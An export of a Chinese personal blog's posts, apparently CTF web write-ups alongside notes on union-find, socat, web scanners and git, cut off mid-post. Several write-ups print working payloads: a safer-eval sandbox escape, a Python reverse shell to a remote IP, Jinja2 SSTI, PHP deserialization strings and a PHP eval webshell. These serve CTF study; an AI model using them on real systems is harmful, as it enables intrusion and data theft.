[{"content":"引言 前几天做leetcode周赛有道题解了许久，sky告诉我一种新的数据结构可以快速干掉那题，并查集。特来学习一下，本文中我讲介绍基础到经过路径压缩的并查集。\n并查集 一种数据结构，在这个数据结构中，相同的集合拥有相同的标签，不同的集合标签不同。用来元素分组问题，支持两种不同类型的操作：\n 合并（union）：把两个元素所在的集合合并为一个集合 查询（find）：查询元素所属的集合  初始化 初始时所有元素都归属于单独的一个集合，最常见的一种初始化方式是fa[x]=x\n1 2 3 4 5 6  vector\u0026lt;int\u0026gt; fa; inline void init(int n) { for (int i = 1; i \u0026lt;= n; ++i) fa.push_back(i); }   对于这段代码，c++有另一个函数可以实现上述功能。\niota函数对一个范围数据进行赋值：\n1 2 3 4 5 6 7 8 9  template \u0026lt;class ForwardIterator, class T\u0026gt; void iota (ForwardIterator first, ForwardIterator last, T val) { while (first!=last) { *first = val; ++first; ++val; } }   iota版本\n1 2 3 4 5 6  vector\u0026lt;int\u0026gt; fa; inline void init(int n) { fa.resize(n); iota(fa.begin(), fa.end(), 0); }   原始版查询、合并 查询 1 2 3 4 5 6 7  int F(int x) { if(fa[x] == x) return x; else return F(fa[x]); }   合并 1 2 3 4  inline void U(int i, int j) { fa[F(i)] = F(j); }   这个版本有个缺点，在合并的过程中fa只记录了节点的父亲节点，但是我们要找到根节点来代表这个集合，因此只能不断的向上找，直到找到根节点。有什么办法对次进行优化的吗？\n路径压缩 这个思路比较直接。既然每次递归调用问父节点，直到父节点发现自己的父节点是自己，从而结束递归，那么在函数自底向上逐个返回之前，在当前节点记录下根节点。这有个形象的比喻：既然每次找的时候父亲都会不断的递归问父亲你知不知道祖宗是谁？如果他发现就是自己，那么就会向他的儿子回复祖宗是我，他的儿子向儿子的儿子说祖宗是ｘ。那么在儿子告诉儿子的儿子的时候记住祖宗是谁不就行了吗？以后谁再问祖宗是谁，该节点表示早就在其他人问的时候就记住了。\n查询 1 2 3  int F(int x) { return x == ids[x] ? x : (ids[x] = F(x)); }   合并 1 2 3  void U(int i, int j) { ids[F(i)] = ids[F(j)]; }   这个版本在每次递归查询的时候都会把根节点的值赋值给递归调用路径上的所有节点。\n扩展练习 547. 省份数量 - 力扣（LeetCode）\n1722. 执行交换操作后的最小汉明距离 - 力扣（LeetCode）\n参考 Union Find – Kyle\u0026rsquo;s Blog\n算法学习笔记（１）：并查集－Pecco的知乎\n","description":"并查集学习笔记","id":0,"section":"posts","tags":["Data Structure","Algorithms"],"title":"并查集","uri":"https://lurenxiao1998.github.io/zh/posts/union-find-disjoint-sets/"},{"content":"[GKCTF2020]EZ三剑客-EzNode (day1 1-8) 进index页给了两个钮源码和版本\n版本页：\n1 2 3 4 5 6 7 8 9 10 11  { \u0026#34;name\u0026#34;: \u0026#34;src\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;body-parser\u0026#34;: \u0026#34;1.19.0\u0026#34;, \u0026#34;express\u0026#34;: \u0026#34;4.17.1\u0026#34;, \u0026#34;safer-eval\u0026#34;: \u0026#34;1.3.6\u0026#34; } }   再看源码。主要是一个post到eval运用saferEval。初步猜测saferEval应该是一个有限制的命令执行，题目给了版本可能是有某个CVE。上网一搜saferEval看到有关的CVE-2019-10769(任意代码执行漏洞）\n已经给了一个exploit：Arbitrary Code Execution\n接下来就是绕过了，在执行前有拦截器，当req.path === '/eval'时，会先设置一个较长的计时器，这个计时器如果超时就会执行eval。然后立马取消该计时器。\n这个地方感觉可以通过hack Math.max()，通过把delay调成一个超小值在计时器取消前超时，不过我没想出来怎么hack Math。用了另一种方式，当把uri改成/eval/。req.path === '/eval'为否，但会触发/eval\npayload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  (function () { const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } }; function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!==\u0026#39;number\u0026#39;) return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\u0026#34;return process\u0026#34;)(); break; }catch(x){ i++; } } return i.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString() })()   由于有换行urlencode一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  POST /eval/ e=(function+()+{ ++const+f+%3d+Buffer.prototype.write%3b ++const+ft+%3d+{ ++++length%3a+10, ++++utf8Write(){ ++++} ++}%3b ++function+r(i){ ++++var+x+%3d+0%3b ++++try{ ++++++x+%3d+r(i)%3b ++++}catch(e){} ++++if(typeof(x)!%3d%3d\u0026#39;number\u0026#39;) ++++++return+x%3b ++++if(x!%3d%3di) ++++++return+x%2b1%3b ++++try{ ++++++f.call(ft)%3b ++++}catch(e){ ++++++return+e%3b ++++} ++++return+null%3b ++} ++var+i%3d1%3b ++while(1){ ++++try{ ++++++i%3dr(i).constructor.constructor(\u0026#34;return+process\u0026#34;)()%3b ++++++break%3b ++++}catch(x){ ++++++i%2b%2b%3b ++++} ++} ++return+i.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;cat /flag\u0026#34;).toString() })()   参考 safer-eval github\nArbitrary Code Execution in safer-eval | Snyk\nCVE-2019-10769-README.md · GitHub\nGitHub - patriksimek/vm2: Advanced vm/sandbox for Node.js\n[V\u0026amp;N2020 公开赛]CHECKIN 上来就给了源码\n看这题，无回显，shell上来直接删flag。感觉应该用反弹shell来做，本地搭的环境经过测试可以反弹shell。在云端的不行，估计是有防火墙？\n我发现sleep可以。但是也没什么好的主意。没办法了，看WP\nWP用的python3弹shell成功了。为什么bash直接弹不行(一︿一+)\n1  python3 -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;174.1.85.126\u0026#39;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/bash\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34;   学到新知识，当文件描述符正在打开，而文件被删除\n仍然可以在proc/[process-id]/fd/[fd-id]里看到文件内容。本题反弹shell上去之后执行\n1  cat /proc/*/fd/*   即可拿到flag\n参考 各种环境下反弹shell的方法\n[V\u0026amp;N2020 公开赛]CHECKIN-python黑洞网\n刷题记录：[V\u0026amp;N2020 公开赛]CHECKIN - MustaphaMond - 博客园\n","description":"本文用来记录作者在2021年寒假期间的刷题情况","id":1,"section":"posts","tags":["BUUCTF","webctf"],"title":"CTF刷题训练之寒假篇","uri":"https://lurenxiao1998.github.io/zh/posts/2020winterctftraining/"},{"content":"简介 做web的时候为了对漏洞有更深入的理解，常常需要对交互的流量进行分析，在此记录笔者用到的流量分析工具。\nSocat Socat是一个多功能的网络工具，名字来由是 ”Socket CAT”，可以看作是netcat的加强版，socat的官方网站：http://www.dest-unreach.org/socat/。\nSocat是一个两个独立通道之间的双向数据传输的中继器，我主要用来端口转发。\n用法 1  socat [options] address address   其中address的描述就是socat的精髓所在了，几个常用的描述方式如下：\n -,STDIN,STDOUT : 表示标准输入输出，可以就用一个横杠代替，不用多解释了吧_(:з」∠)_ /var/log/syslog : 文件路径，打开一个文件作为数据流。如果是相对路径要使用./。 TCP:address:port : 建立一个TCP连接作为数据流，TCP也可以替换为UDP。 TCP-LISTEN:port : 建立TCP监听端口，TCP也可以替换为UDP。 EXEC:command : 执行一个程序作为数据流。  以上规则中前面的TCP等都可以小写。\n[options]。常用的选项如下：\n -v : 将传输的数据不仅写入其目标流，还写入stderr。输出格式是文本，为了可读性进行了一些转换，并以“\u0026gt;”或“\u0026lt;”作为前缀，表示流向。 -x : 将传输的数据不仅写入其目标流，还写入stderr。输出格式为十六进制，前缀“\u0026gt;”或“\u0026lt;”表示流向。可以与-v组合。  转发redis数据 以转发redis为例\n1  socat -x -v TCP-LISTEN:6376,fork tcp-connect:127.0.1:6379   在redis-cli中执行如下命令\n127.0.0.1:6376\u0026gt; set name test OK 127.0.0.1:6376\u0026gt; get name \u0026quot;test\u0026quot; 127.0.0.1:6376\u0026gt; 得到的回复如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  \u0026gt; 2020/12/17 22:30:53.275257 length=33 from=17 to=49 2a 33 0d 0a *3.. 24 33 0d 0a $3.. 73 65 74 0d 0a set.. 24 34 0d 0a $4.. 6e 61 6d 65 0d 0a name.. 24 34 0d 0a $4.. 74 65 73 74 0d 0a test.. -- \u0026lt; 2020/12/17 22:30:53.275982 length=5 from=18609 to=18613 2b 4f 4b 0d 0a +OK.. -- \u0026gt; 2020/12/17 22:31:11.943001 length=23 from=50 to=72 2a 32 0d 0a *2.. 24 33 0d 0a $3.. 67 65 74 0d 0a get.. 24 34 0d 0a $4.. 6e 61 6d 65 0d 0a name.. -- \u0026lt; 2020/12/17 22:31:11.943537 length=10 from=18614 to=18623 24 34 0d 0a $4.. 74 65 73 74 0d 0a test.. --   如果对RESP了解的话，可以看到命令作为Bulk Strings的数组，服务器根据发送的请求给予回复。以上述数据为例，首先是*3，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[\u0026ldquo;set\u0026rdquo;,\u0026ldquo;name\u0026rdquo;,\u0026ldquo;test\u0026rdquo;]），接着$3，字符串长度为３，每行结束以0d 0a即\\r\\n结尾……服务器返回简单字符串＋OK，\n利用上述的方法可以获取redis客户端与服务器的交互流量，对流量进行格式转换之后，可以利用dict协议或gopher协议进行ssrf。\n","description":"利用流量分析工具转发，输出。以对交互流量进行分析。","id":2,"section":"posts","tags":["Socat","web","webctf"],"title":"浅尝流量分析工具","uri":"https://lurenxiao1998.github.io/zh/posts/%E6%B5%85%E5%B0%9D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"},{"content":"分析 打开网页首先是一段源码，右键查看网页源代码，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import flask import os app = flask.Flask(__name__) app.config[\u0026#39;FLAG\u0026#39;] = os.environ.pop(\u0026#39;FLAG\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__).read() @app.route(\u0026#39;/shrine/\u0026lt;path:shrine\u0026gt;\u0026#39;) def shrine(shrine): def safe_jinja(s): s = s.replace(\u0026#39;(\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;)\u0026#39;, \u0026#39;\u0026#39;) blacklist = [\u0026#39;config\u0026#39;, \u0026#39;self\u0026#39;] return \u0026#39;\u0026#39;.join([\u0026#39;{{ % set {}=None%}}\u0026#39;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True)   查看发现\n1  render_template_string(safe_jinja(shrine))   那这题应该是个SSTI，这个我之前不怎么会，赶紧搜搜搜，然后试了一波，发现很多都没有过滤小括号的教程，开始陷入迷茫。\n之后google发现大佬的wp，赶紧跟着做一波\n解题 以下为大佬原文，链接在reference最后一个\n1  {{7*7}}   1  {{7*\u0026#39;7\u0026#39;}}   测试发现是 jinja2 或 Twig，后端源码为 flask\n所以这个是关于 flask + jinja2 的 SSTI\n至于为什么，请看图\n1  {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()}}   明显这里对 () 进行了过滤\n只能从别的地方入手，例如 flask 的内置函数和变量，\n当然，config 和 self 也被加入了黑名单\n但通过变量去读取 app.config 也会涉及到 () 的使用\n所以只剩下内置函数\nget_flashed_messages(), url_for()\n构造payload\n1  {{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}}   得到flag\nreference   浅析SSTI(python沙盒绕过)\n  CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】\n  [WP-TokyoWesterns CTF 4th 2018 shrine](WP-TokyoWesterns CTF 4th 2018 shrine)\n  ","description":"[WesternCTF2018]shrine","id":3,"section":"posts","tags":["BUUCTF","ctf","web","webctf","shrine"],"title":"[WesternCTF2018]shrine","uri":"https://lurenxiao1998.github.io/zh/posts/westernctf2018shrine/"},{"content":"知识点  http请求头  解题过程 访问题目，F12查看源码\n发现有个Secret.php，访问\n看到这个应该就知道是要修改请求头了，可以用Modify Headers这个插件，或者直接burp suit。添加referer，这个项表示从哪个网页所属的域名跳转过来的（比如从百度点进来就是www.baidu.com）\n接着修改user-agent请求头\n接着修改X-Forwarded-For请求头，表示请求从哪个用户发出的。改为127.0.0.1\n获取flag\nreference 关于HTTP_CLIENT_IP,HTTP_X_FORWAR\nhttp请求头中Referer的含义和作用\n","description":"[极客大挑战2019]Http","id":4,"section":"posts","tags":["BUUCTF","ctf","web","webctf","Http"],"title":"[极客大挑战2019]Http","uri":"https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http/"},{"content":"知识点  Unicode安全问题  过程 这题buuctf环境没搭好？前三个正常字符也买不了，最后一个我试了其他的一万字符出错了。\n0xF0 0x90 0xA7 0xA4\n这题编码为utf-8，去https://www.compart.com/en/unicode/找一个unicode字符在用unicodedata.numeric转的时候大于1337。\npayload id=4\u0026amp;price=%E1%8D%BC\n参考 [ASIS 2019]Unicorn shop\n2019-asis\n","description":"[ASIS 2019]Unicorn shop","id":5,"section":"posts","tags":["BUUCTF","ctf","web","webctf","Unicorn shop"],"title":"[ASIS 2019]Unicorn shop","uri":"https://lurenxiao1998.github.io/zh/posts/asis-2019unicorn-shop/"},{"content":"知识点  反序列化绕过__wakeup魔术方法（当成员属性数目大于实际数目时可绕过）  解题过程 题目说备份，应该是要下载网站源代码审计。我用的扫描工具是dirsearch（没扫出来）\n在扫描工具还没扫出来的时候我乱试了一个/www.zip居然成功了。\n代码审计发现index.php有个\n1 2  $select = $_GET[\u0026#39;select\u0026#39;]; $res=unserialize(@$select);   应该是个反序列化绕过__wakeup获取到flag\npayload 1  /index.php?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}   ","description":"[极客大挑战 2019]PHP","id":6,"section":"posts","tags":["BUUCTF","ctf","web","webctf","PHP"],"title":"[极客大挑战 2019]PHP","uri":"https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php/"},{"content":"知识点  一句话木马  解题过程 弟弟题，直接给了shell\npayload 1  system(\u0026#34;ls -l /\u0026#34;);   1  system(\u0026#34;cat /flag\u0026#34;);   ","description":"[极客大挑战 2019]Knife","id":7,"section":"posts","tags":["BUUCTF","ctf","web","webctf","Knife"],"title":"[极客大挑战 2019]Knife","uri":"https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife/"},{"content":"知识点 https://paper.seebug.org/164/\npayload 1  \u0026#39; \u0026lt;?php @eval(\\$_POST[\\\u0026#34;hack\\\u0026#34;]);?\u0026gt; -oG hack.php \u0026#39;   ","description":"[BUUCTF 2018]Online Tool","id":8,"section":"posts","tags":["BUUCTF","ctf","web","webctf","Online Tool"],"title":"[BUUCTF 2018]Online Tool","uri":"https://lurenxiao1998.github.io/zh/posts/buuctf-2018online-tool/"},{"content":"知识点  php反序列化 php伪协议 include利用php伪协议  解题过程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u0026lt;?php $text = $_GET[\u0026#34;text\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($text)\u0026amp;\u0026amp;(file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the zjctf\u0026#34;)){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;\u0026#34;.file_get_contents($text,\u0026#39;r\u0026#39;).\u0026#34;\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;Not now!\u0026#34;; exit(); }else{ include($file); //useless.php  $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u0026gt;  先试下\n1  text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=   然后用\n1  text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=\u0026amp;file=php://filter/read=convert.base64-encode/resource=useless.php   查看useless的代码（base64编码）\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php class Flag{ //flag.php  public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } ?\u0026gt;  然后可以让$password等于Flag的序列化。file为flag.php。\npayload 最后的payload\n1  text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=\u0026amp;file=useless.php\u0026amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}   然后页面说很接近了，我差点以为这不对，还好我又用burpsuit的repeater又试了一下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  HTTP/1.1 200 OK Server: openresty Date: Mon, 20 Jan 2020 14:37:46 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 215 Connection: close Vary: Accept-Encoding X-Powered-By: PHP/5.6.40 \u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;welcome to the zjctf\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt; \u0026lt;br\u0026gt;oh u find it \u0026lt;/br\u0026gt; \u0026lt;!--but i cant give it to u now--\u0026gt; \u0026lt;?php if(2===3){ return (\u0026#34;flag{15a85e3f-197a-4b8f-918b-73cc19e83db3}\u0026#34;); } ?\u0026gt; \u0026lt;br\u0026gt;U R SO CLOSE !///COME ON PLZ   成功获取flag\n","description":"[ZJCTF 2019]NiZhuanSiWei","id":9,"section":"posts","tags":["BUUCTF","ctf","web","webctf","NiZhuanSiWei"],"title":"[ZJCTF 2019]NiZhuanSiWei","uri":"https://lurenxiao1998.github.io/zh/posts/zjctf-2019nizhuansiwei/"},{"content":"[极客大挑战 2019]Secret File 知识点   配合php伪协议利用文件包含漏洞\n  PHP伪协议总结\n  使用php的file伪协议去读取文件\npayload ?file=php://filter/convert.base64-encode/resource=flag.php\n","description":"[极客大挑战 2019]Secret File","id":10,"section":"posts","tags":["BUUCTF","ctf","web","webctf","Secret File"],"title":"[极客大挑战 2019]Secret File","uri":"https://lurenxiao1998.github.io/zh/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file/"},{"content":"反序列化漏洞 考点   PHP反序列化漏洞\n  弱口令\n  解题过程 开头看到这个，爆破。\n用户名admin，密码admin888\n获得一个照片地址，但没啥用，点help，发现请求不了，连刚才给的照片地址都请求不了。\n看了大佬wr，发现把请求改成post可以访问\n之后访问WEB-INF/web.xml\n根据com.wm.ctf.FlagController可以访问flag\n把这一段base64解密可得flag\n","description":"[RoarCTF 2019]Easy Java","id":11,"section":"posts","tags":["BUUCTF","ctf","web","webctf","Easy Java"],"title":"[RoarCTF 2019]Easy Java","uri":"https://lurenxiao1998.github.io/zh/posts/roarctf-2019easy-java/"},{"content":"前言 这道题主要考两个知识点：\n  数组绕过正则\n preg_match(pattern,Array()) = false md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) =null strcmp(Array(), “abc”) =null strpos(Array(),“abc”) = null strlen(Array()) = null    改变序列化字符串，导致反序列化漏洞\n改变序列化之后的字符串，使反序列化时成功反序列化并改变数组值。\n举个例子：\n  1 2 3 4 5 6  $profile = \u0026#39;a:2:{s:8:\u0026#34;nickname\u0026#34;;a:1:{i:0;s:204:\u0026#34;wherewherewherewhere wherewherewherewherewherewherewherewherewherewherewherewherewhere wherewherewherewherewherewherewherewherewherewherewherewherewhere wherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;}\u0026#34;;}s:5:\u0026#34;photo\u0026#34;; s:13:\u0026#34;lurenxiao.jpg\u0026#34;;}\u0026#39;; var_dump(unserialize($profile));     结果：\narray(2) {\n[\u0026ldquo;nickname\u0026rdquo;]=\u0026gt;\narray(1) {\n[0]=\u0026gt;\nstring(204) \u0026ldquo;wherewherewherewherewherewherewherewherewherewhere\nwherewherewherewherewherewherewherewherewherewherewherewhere\nwherewherewherewherewherewherewherewherewherewherewherewhere\u0026rdquo;;}\ns:5:\u0026ldquo;photo\u0026rdquo;;s:10:\u0026ldquo;config.php\u0026rdquo;;}\u0026quot;\n}\n[\u0026ldquo;photo\u0026rdquo;]=\u0026gt;\nstring(13) \u0026ldquo;lurenxiao.jpg\u0026rdquo;\n}\n  当我们把所有的where替换成hacker\n  1 2 3 4 5 6  $profile = \u0026#39;a:2:{s:8:\u0026#34;nickname\u0026#34;;a:1:{i:0;s:204:\u0026#34;hackerhackerhacker hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker hackerhackerhackerhackerhackerhackerhackerhackerhacker\u0026#34;;} s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;}\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:13:\u0026#34;lurenxiao.jpg\u0026#34;;}\u0026#39;; var_dump(unserialize($profile));     结果：\narray(2) {\n[\u0026ldquo;nickname\u0026rdquo;]=\u0026gt;\narray(1) {\n[0]=\u0026gt;\nstring(204) \u0026ldquo;hackerhackerhackerhackerhackerhackerhacker\nhackerhackerhackerhackerhackerhackerhackerhackerhacker\nhackerhackerhackerhackerhackerhackerhackerhackerhacker\nhackerhackerhackerhackerhackerhackerhackerhackerhacker\u0026rdquo;\n}\n[\u0026ldquo;photo\u0026rdquo;]=\u0026gt;\nstring(10) \u0026ldquo;config.php\u0026rdquo;\n}\n  我们可以看到photo的值从lurenxiao.jpg变成了config.php。\n要了解这个首先了解序列化字符串的结构：\n 'a:2:{s:8:\u0026quot;nickname\u0026quot;;a:1:{i:0;s:204:\u0026quot;hackerhackerhacker\rhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\rhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\rhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\rhacker\u0026quot;;}s:5:\u0026quot;photo\u0026quot;;s:10:\u0026quot;config.php\u0026quot;;}\u0026quot;;}s:5:\u0026quot;photo\u0026quot;;s:13:\r\u0026quot;lurenxiao.jpg\u0026quot;;}' 上边这个序列化第一个a表示数组，2表示有两个值 之后跟着key和value。  在s:A:\u0026quot;*******\u0026quot; 反序列化时，不管s:A:\u0026quot;​之后是什么（包括双引号和单引号），都会数A个字符作为这个反序列化的结果。\n在字符串从前向后的反序列化过程中，若在字符串的某个位置成功反序列化，那么后续的字符串都会被抛弃。\n如何看不懂可以看这位大佬的writeup https://www.jianshu.com/p/3b44e72444c1，讲得比较详细。\n  解题过程 用扫描器扫描网站，dirsearch和御剑可以扫出www.zip\n我们在config.php可以看到flag\n看来是要我们获取config.php，审查源码，Seay可以给到一个提示（第三行\n​ $photo = base64_encode(file_get_contents(​$profile[\u0026lsquo;photo\u0026rsquo;]));\n而配置由update.php上传，并进行序列化\n看update_profile这个函数，filter之后上传\n看filter，发现\u0026rsquo;select', \u0026lsquo;insert\u0026rsquo;, \u0026lsquo;update\u0026rsquo;, \u0026lsquo;delete\u0026rsquo;, \u0026ldquo;where\u0026quot;替换为\u0026quot;hacker\u0026rdquo;，只有where从5个字符变成6个字符多一个字符，这个时候想到可以用上边 改变序列化字符串，导致反序列化漏洞 。在nickname中插入where字符，在filter的时候会把where替换为hacker，导致部分字符逃逸。逃逸出的字符为设置photo为config.php的字符。\n但是事情还没有那么简单，题目在我们上传nickname的时候给了一些限制\n限制了nickname的长度，怎么办呢？这个时候就用到了 数组绕过正则 这个知识点让$_POST[\u0026lsquo;nickname\u0026rsquo;]为一个数组，就可以让这两个都为非。\n结果 在update.php上传时，\n 把nickname改为nickname[] 值为wherewherewherewherewherewherewherewherewherewhere\rwherewherewherewherewherewherewherewherewherewherewherewhere\rwherewherewherewherewherewherewherewherewherewherewherewhere\r\u0026quot;;}s:5:\u0026quot;photo\u0026quot;;s:10:\u0026quot;config.php\u0026quot;;}  之后访问profile.php\n把这一段base64解密可得flag\n","description":"buuctf piapiapia","id":12,"section":"posts","tags":["BUUCTF","ctf","web","webctf","0CTF","piapiapia"],"title":"piapiapia","uri":"https://lurenxiao1998.github.io/zh/posts/0ctf-2016piapiapia/"},{"content":"SSRF简介 SSRF(Server-Side Request Forgery：服务器端请求伪造)是攻击者利用服务端为外部提供服务的机器的漏洞，访问服务器端的内网服务。\n前置知识 RESP协议  Redis 服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。\n  RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。\n RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。\nRESP在Redis中用作请求 - 响应协议的方式如下：\n 客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。 服务器根据命令实现回复一种RESP类型。  在RESP中，某些 RESP 的类型取决于第一个字节：\n 对于 Simple Strings，回复的第一个字节是 + 对于 error，回复的第一个字节是 - 对于 Integer，回复的第一个字节是 : 对于 Bulk Strings，回复的第一个字节是 $ 对于 array，回复的第一个字节是 * 此外，RESP 能够使用稍后指定的 Bulk Strings 或 Array 的特殊变体来表示 Null 值。 在RESP中，协议的不同部分始终以\u0026quot;\\r\\n\u0026quot;(CRLF)结束。  ","description":"buuctf piapiapia","id":13,"section":"posts","tags":["ctf","web","webctf"],"title":"piapiapia","uri":"https://lurenxiao1998.github.io/zh/posts/redis-ssrf/"},{"content":"dirsearch、dirb和nikto；御剑\n这些软件单独一个都不一定能够扫出，比如说fakebook这道题nikto能扫，[0CTF 2016]piapiapia这道题扫不出，但是dirsearch和御剑可以。只能说在遇到需要扫描的时候都试一试吧。\n安装方法 dirsearch 从github上下载https://github.com/maurosoria/dirsearch\n上边有介绍用法，运行这个需要python3，我在wsl kali装的，没预装python3，需要\n1  apt install python3   用法 简单实例：\n ./dirsearch.py -u http://a1c9dbb6-3b7a-40d0-a70a-7d7862503031.node3.buuoj.cn/ -e php -s 1  常用参数 -u 指定url\n-e 指定网站语言\n-w 可以加上自己的字典（带上路径）\n-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）\n-s 指定请求之间的间歇时间，单位应该是s，支持浮点数（有些网站对请求速度有限制，可以用这个参数限制请求速度）\ndirb 安装 可以\n1  apt install dirb   用法 1  dirb http://a1c9dbb6-3b7a-40d0-a70a-7d7862503031.node3.buuoj.cn/   1  dirb \u0026lt;url_base\u0026gt; [\u0026lt;wordlist_file(s)\u0026gt;] [options]   常用参数   -z \u0026lt;millisecs\u0026gt; : Add a milliseconds delay to not cause excessive Flood.\n  -p \u0026lt;proxy[:port]\u0026gt; : Use this proxy. (Default port is 1080)\n  -P \u0026lt;proxy_username:proxy_password\u0026gt; : Proxy Authentication.\n  -H \u0026lt;header_string\u0026gt; : Add a custom header to the HTTP request.\n  nikto 安装 1  apt install nikto   用法 1  nikto -host http://a1c9dbb6-3b7a-40d0-a70a-7d7862503031.node3.buuoj.cn/ -p 80   常用参数   -host 目标主机，主机名、IP地址、主机列表文件。\n  -port 扫描端口指定，默认为80端口\n  -Pause 每次操作之间的延迟时间\n  -timeout 每个请求的超时时间，默认为10秒\n  -useproxy 使用指定代理扫描\n  参考 目录爆破工具dirsearch\nWeb安全测试-Nikto漏洞扫描工具检测\n","description":"常用的web扫描工具","id":14,"section":"posts","tags":["dirsearch","dirb","nikto","御剑","web","webctf"],"title":"web扫描工具","uri":"https://lurenxiao1998.github.io/zh/posts/web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"},{"content":"方法一 输入\ngit config --global credential.helper store\n之后push一次即可\n方法二（ssh-keygen） 生成秘钥 参考服务器上的 Git - 生成 SSH 公钥\n放到github上 把~/.ssh/id_rsa.pub这个公钥放到你的github账户上\n登录github，$settings-\u0026gt;SSH and GPG keys-\u0026gt;New SSH key$\n![](/images/posts/不用输入密码git push/DeepinScreenshot_select-area_20191210020132.png)\n![](/images/posts/不用输入密码git push/DeepinScreenshot_select-area_20191210020346.png)\ntitle随便填，key填id_rsa.pub里的内容。add ssh key即可\n","description":"","id":15,"section":"posts","tags":["git"],"title":"不用输入密码git push","uri":"https://lurenxiao1998.github.io/zh/posts/%E4%B8%8D%E7%94%A8%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81git-push/"},{"content":"介绍   hashpump是一个由$hash(key+data)$、$len(key+data)$和消息$m$，计算出$hash(key+data+padding0+m)$结果，和 $data+padding0+m$ 的工具\n  其中\n key是一个不变的值 hash(key)为key的hash值 len(key)为key的长度 m由你指定 padding由key和你指定的m确定 data是一个已知的值，理论上可以为空，但是hashpump好像不支持    目前最新版本hashpump（v1.2.0）已经支持 CRC32, MD5, SHA1, SHA256 和 SHA512\n  安装 我安装系统为kali（debian系）\n1 2 3 4 5 6  git 